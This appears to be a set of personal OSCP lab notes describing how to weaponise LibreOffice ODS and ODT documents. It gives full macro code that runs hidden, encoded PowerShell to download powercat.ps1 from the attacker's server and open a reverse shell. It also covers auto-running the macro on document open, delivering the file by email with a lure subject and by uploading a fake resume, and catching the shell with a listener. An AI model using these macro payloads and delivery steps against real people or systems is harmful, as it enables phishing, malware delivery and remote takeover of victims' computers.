```
cd ~/Desktop/Tools/MMG-LO
```

With a few modifications to the generator, I adjusted the macro to download `powercat.ps1` from my Python3 web server and use it to establish a reverse shell.


Start listener on 4444
```
cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
```

Start python server to host powercat.ps1 on KALI ATTACKER
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

Modify ODS.py
```
gedit mmg-ods.py
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `...SNIP...  
if sys.argv[1] == 'windows':  
  
 vbacall = '''Set oShell = CreateObject("Wscript.Shell")  
 oShell.Run'''  
 build_payload = (f'IEX(New-Object System.Net.WebClient).DownloadString("http://${KaliIP}/powercat.ps1");powercat -c ${KaliIP} -p 4444 -e powershell')  
 bytes_encoded = (base64.b64encode(bytes(build_payload, 'utf-16le')))  
 base64payload = bytes_encoded.decode()  
 payload = 'powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -e ' + base64payload  
 print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Payload: windows reverse shell")  
 print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Creating malicious .ods file\n")  
 Macro_Gen()  
...SNIP...`;

dv.paragraph("```bash\n" + command + "\n```");
```
Next, I generated the malicious ODS file using Python3.

**Command:** python3 mmg-ods.py windows 192.168.45.159 1337
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd ~/Desktop/Tools/MMG-LO && python3 mmg-ods.py windows ${KaliIP} 4444`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/MMG-LO && sudo swaks -t [target@localhost] --from [sender@localhost] --attach @file.ods --server ${ip} --body "My message to you" --header "Subject: Please check this spreadsheet"`;

dv.paragraph("```bash\n" + command + "\n```");
```
Send the ODS file to IMAP.

Catch reverse connection

---

ODT files only > LibreOffice Macro Injection

Install LibreOffice
```
sudo apt update 
``` 
  
```
sudo apt install libreoffice
```

In LibreOffice, Open new document

Go to Tools → Macros → Organize Macros → Basic

![[Pasted image 20260801130537.png]]

Select your document, then New, and give it a name.

![[Pasted image 20260801130544.png]]

This will open up a work space. We will embed the following command in our macro. This will simply call back to our machine. It’s a test.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `Shell("cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""IEX(New-Object System.Net.WebClient).DownloadString('http://${KaliIP}/powercat.ps1'); powercat -c ${KaliIP} -p 135 -e powershell""")`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260801130629.png]]

Then go back to the document (Dork-resume), select Tools and Customize.

![[Pasted image 20260801130640.png]]

Select EVENTS > Open Document then Assign Macro…

![[Pasted image 20260801130649.png]]

Select the Macro (Evil) that we created for our document and OK.

![[Pasted image 20260801130702.png]]

Note that the macro is now assigned to the action.

![[Pasted image 20260801130712.png]]

Close it by selecting OK again and save the document (Dork-resume)

Host powercat on KALI ATTACKER
```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

Open Penelope listener on KALI ATTACKER

```
cd ~/Desktop/Tools && python3 penelope.py -p 135 -O / --oscp-safe
```

Go back to the web page and upload the newly created resume.

![[Pasted image 20260801130754.png]]

We check our listener and after about 10 seconds we get a connection.

---

ODS file creation

